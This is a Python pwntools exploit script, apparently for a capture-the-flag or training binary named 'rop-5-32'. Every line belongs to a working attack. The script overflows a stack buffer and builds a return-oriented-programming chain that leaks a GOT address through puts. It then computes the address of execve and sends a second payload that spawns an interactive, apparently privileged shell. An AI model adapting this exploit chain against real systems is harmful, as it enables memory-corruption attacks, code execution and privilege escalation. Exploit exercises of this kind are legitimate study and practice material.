from pwn import *
import binascii

GARB = 'bbbb'

# Requires symlink from puts to sh binary

execve_init_addr = 0xf7e7f7e0
prctl_init_addr = 0xf7eb6ac0
offset = execve_init_addr - prctl_init_addr

# Addresses needed for the attack
pop_ret_addr = 0x08048349 # From ROPgadget --binary ./rop-5-32
pop_pop_ret_addr = 0x080485da # From ROPgadget --binary ./rop-5-32
puts_addr = ELF('./rop-5-32').symbols['puts']
strcpy_addr = ELF('./rop-5-32').symbols['strcpy']
input_func_addr = ELF('./rop-5-32').symbols['input_func']
data_start_addr = 0x0804a024 # Address of the data area
got_addr = 0x0804a01c # Address of the got entry
puts_string_addr = 0x8048281

# Build rop chain
inp = ('a' * 0x88) + 'cccc'
inp = inp + p32(strcpy_addr) + p32(pop_pop_ret_addr) + p32(data_start_addr) + p32(got_addr)
inp = inp + p32(puts_addr) + p32(pop_ret_addr) + p32(got_addr)
inp = inp + p32(input_func_addr)

# Launch processs and send rop chain
p = process('./rop-5-32')
p.send(inp)

# Use privilleged shell to get the flag
# p.interactive()
data = p.recv()
print(data.split('\n'))
prctl_addr = u32(data.split('\n')[3])
print(hex(prctl_addr))
execve_addr = prctl_addr + offset
print(hex(execve_addr))

inp = ('a' * 0x88) + GARB + p32(execve_addr) + GARB + p32(puts_string_addr) + p32(0) + p32(0)
p.send(inp)
p.interactive()
